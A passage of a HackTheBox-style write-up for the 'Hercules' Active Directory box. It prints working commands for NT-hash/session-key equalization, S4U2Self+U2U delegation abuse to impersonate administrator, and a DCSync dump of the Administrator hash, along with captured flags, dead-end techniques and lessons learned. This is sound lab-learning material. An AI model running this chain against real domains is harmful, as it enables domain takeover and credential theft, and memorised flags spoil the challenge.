$ impacket-getTGT 'hercules.htb/IIS_Webserver$' -hashes ':cf0eb6e64d5a5994fe1257e612b93cdf' -dc-ip 10.129.242.196
$ python3 -c "from impacket.krb5.ccache import CCache; cc = CCache.loadFile('IIS_Webserver\$.ccache'); ..."
Session Key: c3e720602a0ede2a4174321732a2b4e5

$ impacket-changepasswd 'hercules.htb/IIS_Webserver$@dc.hercules.htb' \
    -newhashes ':c3e720602a0ede2a4174321732a2b4e5' -hashes ':cf0eb6e64d5a5994fe1257e612b93cdf' \
    -dc-ip 10.129.242.196 -k
[*] Password was changed successfully.
```

**6. S4U2Self+U2U → S4U2Proxy, exploiting an already-live RBCD grant.** Before spending this,
`DC$`'s `msDS-AllowedToActOnBehalfOfOtherIdentity` was verified directly rather than assumed from
the reference — it was already, genuinely, by design on this instance, set to `IIS_Webserver$`'s
SID:

```
$ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'DC$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity
msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-...-1124)   # = IIS_Webserver$
```

The same, never-reissued `IIS_Webserver$` ccache (whose NT-hash-as-session-key equality is the
whole trick) is reused so the KDC's own decryption succeeds:

```
$ python3 getST.py -spn 'cifs/dc.hercules.htb' -impersonate administrator -dc-ip 10.129.242.196 \
    'hercules.htb/IIS_Webserver$' -k -no-pass -u2u
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```

**7. DCSync — full domain admin never actually held, just enough for one targeted secret:**

```
$ impacket-secretsdump -k -no-pass dc.hercules.htb -dc-ip 10.129.242.196 -just-dc-user administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:56855ee6b7570edefde6ac262200756e:::
```

## Root

```
$ impacket-getTGT 'hercules.htb/administrator' -hashes ':56855ee6b7570edefde6ac262200756e' -dc-ip 10.129.242.196
$ echo 'whoami' | python3 winrm_kerberos_ccache_client.py
hercules\administrator
```

The preflight note that the flag sits at `C:\Users\Admin\Desktop`, not the default
`C:\Users\Administrator\Desktop`, checked out live — a genuinely distinct local `Admin` account is
the intended root owner on this box, confirmed the moment the wrong path was tried and failed:

```
$ Get-Content "C:\Users\Administrator\Desktop\root.txt"
Cannot find path ... because it does not exist.
$ Get-ChildItem "C:\Users\Admin\Desktop" -Force ; Get-Content "C:\Users\Admin\Desktop\root.txt"
C:\Users\Admin\Desktop\desktop.ini
C:\Users\Admin\Desktop\root.txt
37d0494f199d81e731a067c96b7d454a
```

**`user.txt` = `1bbc0bbca5475ae4a9c89e66aede6b06`**
**`root.txt` = `37d0494f199d81e731a067c96b7d454a`**
**`Administrator` NT hash = `56855ee6b7570edefde6ac262200756e`**

With real Administrator rights finally held, most of the engagement's tampering was reverted:
`OU=Forest Migration`'s ownership restored to `Domain Admins`, both added ACEs (`auditor`, `IT
Support`) removed, `IIS_Administrator` disabled again. Three accounts — `fernando.r`,
`IIS_Administrator`, and `iis_webserver$` — permanently carry new passwords/NT hashes as a
disclosed side effect, since their original values were never known and are therefore not
recoverable; this is stated plainly rather than glossed over.

## Rabbit Holes

- **Shadow Credentials across all 6 `Web Support`-`GenericWrite` accounts.** `natalie.a`'s one
  useful BloodHound edge was `GenericWrite` over `ray.n`, `harris.d`, `ken.w`, `johnathan.j`,
  `bob.w`, and `web_admin` — a `GenericWrite` grant is a textbook Shadow Credentials target (add an
  `msDS-KeyCredentialLink`, authenticate via the resulting certificate), and it worked cleanly on
  every one of the 6, recovering real NT hashes for 5. Genuinely closed as a dead end, not assumed:
  a systematic reach-check on every resulting identity (group membership, local admin, WinRM
  eligibility, further outbound ACEs) found that none of the 6 held any privilege beyond what was
  already held. The technique worked perfectly; it just didn't lead anywhere on this box.
- **BadSuccessor/dMSA against `bob.w`'s `CREATE_CHILD` right.** `bob.w`'s live-confirmed
  `CREATE_CHILD` on three OUs is exactly the ACL shape the BadSuccessor/dMSA technique class
  targets (create a delegated managed service account, then abuse it to impersonate an arbitrary
  principal) — a technique pulled from public research on the dMSA attack primitive, not derived
  independently on this box. It hit a hard tool-level negative rather than a permissions gap:
  `DC2025 not found, DMSA not supported`, meaning this domain's functional level genuinely doesn't
  support dMSA objects at all. Confirmed as a domain-capability absence, not something a different
  account or a retry would fix.
- **LibreOffice CVE-2024-12425/12426 against the confirmed `Reports`-consuming instance.** Once
  LibreOffice was confirmed running as `natalie.a` on the DC and its exact version (24.8.1.2) was
  fingerprinted, checking it against known CVEs for that build was the obvious next move — both
  CVEs were confirmed genuinely live and unpatched as information-disclosure/file-read primitives
  against this instance. Neither one converted into code execution, closing this as a real but
  non-actionable finding rather than a missed opportunity.
- **ODF-macro RCE via a `Shell()`-calling Basic macro bound to `dom:load`.** With LibreOffice
  confirmed as the consuming process, a macro-based RCE was the natural escalation from a pure
  information-disclosure read primitive — the `dom:load` event binding was independently verified
  against LibreOffice's own source as the correct open-event mapping before ever testing it, not
  just guessed. Two structurally distinct variants produced no observable side effect; the working
  theory for why is that the pipeline runs LibreOffice with a headless/`--convert-to`-style
  conversion flag, which has its own default macro-execution policy rather than an interactive
  security-warning dialog to click through — but this was never directly confirmed (no OS-level
  visibility into the actual invocation command line was ever obtained on this box), so it's
  recorded here as an unconfirmed working theory, not a proven root cause.

## Skills Learned

- Full-account-list Kerberos pre-auth password spray using a value recovered from an unrelated
  account, landing on a different account entirely
- Blind LDAP injection against a `/login` username field via double-URL-decoding, distinguishing
  a "found user, wrong password" oracle from a "no such user" oracle
- Authenticated path-traversal / arbitrary file read bounded only by `Server.MapPath`'s own
  application-root check, used to recover `web.config`
- Leaked ASP.NET `machineKey` (`decryptionKey`/`validationKey`) weaponized into a hand-rolled
  Forms Authentication ticket forger, reproducing the target's exact
  `ShaVersion`/`CompatibilityMode`/ticket-version parameters by decrypting a real captured cookie
  first rather than guessing them
- Decompiling a recovered ASP.NET assembly (IL reading, not just a decompiler's C# output) to
  root-cause an opaque authorization gate (`User.IsInRole` sourced from a Forms ticket's
  attacker-controlled `UserData`), a validate-after-use LDAP injection, and a traversal primitive's
  real boundary (`Server.MapPath`)
- Bad-ODF NetNTLMv2 capture via an OLE `draw:object` UNC `xlink:href`, running Responder as a
  non-root user by exploiting `net.ipv4.ip_unprivileged_port_start=0` plus neutralizing
  Responder's own hardcoded `geteuid()==0` guard
- Reading a live LibreOffice `.~lock.*#` file to positively identify the account/host consuming
  an uploaded-document pipeline, rather than inferring it from timing alone
- `CREATE_CHILD`-on-OU and OU-ModifyDN (object move) as an ACL-inheritance transplant technique —
  moving a low-value account into an OU another principal has `GenericWrite` over, to inherit that
  edge
- Diagnosing a BloodHound-legacy collector's schema-GUID resolution gap (missing extended
  `CreateChild` rights on OUs) by cross-checking with a live LDAP ACL tool (`bloodyAD`)
- `WriteOwner`'s implicit `WriteDacl` on an unprotected AD container, used to add a fresh ACE
  rather than relying on any pre-existing write grant
- Root-causing a scheduled-task's real trigger condition (a hardcoded literal-identity ACE check,
  `HERCULES\IT Support`, not "any owner") by reading a readable developer copy of its source
  instead of re-running a reference technique blindly
- ESC3 (Enrollment Agent template) abused to request an on-behalf-of certificate for a second,
  higher-value account
- NT-hash/session-key equalization: overwriting a service account's NT hash (via
  `impacket-changepasswd -newhashes`, not a normal password reset) to match its own already-issued
  TGT's session key, enabling a U2U-based S4U2Self trick
- S4U2Self+U2U → S4U2Proxy against an existing Resource-Based Constrained Delegation grant
  (`DC$` → `IIS_Webserver$`) to obtain an `administrator`-impersonating service ticket
- DCSync via `impacket-secretsdump -just-dc-user` to recover `Administrator`'s real NT hash from
  a forged service ticket alone, no direct DA membership ever held

## Lessons Learned

- **A leaked secret's value being real doesn't mean the account it was found on is the account it
  belongs to.** `johnathan.j`'s `description` attribute really did contain the winning password —
  it just wasn't his own. The instinct to keep refining guesses against the account that *carried*
  a hint, instead of testing the literal recovered value broadly across every account, would have
  burned a lot more time on a red herring. Once a credential-shaped string is recovered, spray it
  wide before assuming ownership.
- **A black-box "identical rejection across every variant" result is a strong signal the real
  differentiator hasn't been varied yet, not that the feature is broken.** 36 structurally distinct
  upload probes (file type, size, content, requesting identity) all returned one message — the
  actual gate turned out to be a single `IsInRole` check on a field (`UserData`) none of those 36
  probes had ever touched. Reading the compiled application's own IL, once a path to it existed,
  answered in minutes what black-box permutation testing couldn't answer at all.
- **A tool's summarized "writable" report and the object's real ACL are not the same claim.**
  `bloodyAD get writable`'s own summary said `auditor` had no useful right on `IIS_Administrator`'s
  parent OU — a real `Get-Acl` dump of the same object showed a `WriteOwner`+`WriteDacl` ACE the
  summary simply didn't surface, because it doesn't carry an inheritance flag. The same pattern
  recurred earlier in the engagement: BloodHound-legacy's own collector missed `bob.w`'s
  `CREATE_CHILD` rights on three OUs entirely, due to a schema-GUID resolution gap. Any tool that
  summarizes an ACL is a hypothesis about what's writable, not the ACL itself — cross-check with a
  raw `Get-Acl`/LDAP query before concluding a principal has no reach.
- **An inherited ACL edge travels with an object's OU location; group membership doesn't.** Moving
  `stephen.m` into a different OU transplanted `Web Support`'s `GenericWrite` edge onto him while
  his existing group memberships (and their own `ForceChangePassword` rights) stayed completely
  intact — composing two independently-unremarkable primitives (`CREATE_CHILD`-on-OU plus
  `name`/`cn`-write on an existing account) into a real privilege-chain step that neither one
  provided alone.
- **A scheduled task's documented/assumed trigger condition is not the same as its actual
  condition.** Running the intended "cleanup" script the first time, exactly as a reference
  technique described, produced no effect — my assumption about what would happen was simply wrong
  for this instance. The fix wasn't re-running the same steps harder; it was finding a readable
  developer copy of the actual script and reading the real, hardcoded check (`HERCULES\IT Support`,
  a literal identity string, not "any owner"). When a documented technique doesn't produce the
  effect it's supposed to, treat that as a signal to go find and read the real implementing logic,
  not a signal to retry the same input.
- **Session-key equalization is a legitimate way to control which key a follow-on Kerberos exchange
  actually decrypts with.** Overwriting `IIS_Webserver$`'s NT hash to equal its own already-issued
  TGT's session key (via `impacket-changepasswd -newhashes`, deliberately not a normal password
  reset which would have synced all key material) is what made the subsequent S4U2Self+U2U trick
  work at all — the ordinary `bloodyAD set password` primitive used everywhere else in this
  engagement was the wrong tool for this one specific step, and using it would have silently broken
  the technique.
- **An honest "no viable path found yet" after many exhausted attempts is not the same claim as
  "this box has no path."** Attempt after attempt on this box each correctly, individually closed
  out one more real primitive (Shadow Credentials on six accounts, BadSuccessor, a full ACE
  cross-reference against every high-value target, two real unpatched LibreOffice CVEs) without
  ever finding root — the path that finally worked came from asking a structurally different
  question (ownership, not direct ACEs) about a container object nothing prior had reason to
  suspect yet. The grind of closing out real dead ends with live evidence, rather than assuming or
  hand-waving past them, is what made the eventual find findable at all — and is honestly most of
  what "Insane difficulty" meant on this box.
- **A concurrent, unrelated VPN tunnel on the same attack box is a real, recurring failure mode, not
  a one-off.** The exact same routing collision documented on other boxes in this vault reappeared
  here, at the very start of the engagement, and cost real time to diagnose before any actual recon
  could begin. Checking `ip route show` for a duplicate `10.129.0.0/16` entry before trusting a
  "target unreachable" result is now a standing first move, not a box-specific fix.

See also [[concurrent-vpn-tunnel-interface-pinning]],
[[windows-active-directory-attack-surface-checklist]], and
[[rbcd-via-coercion-relay]].
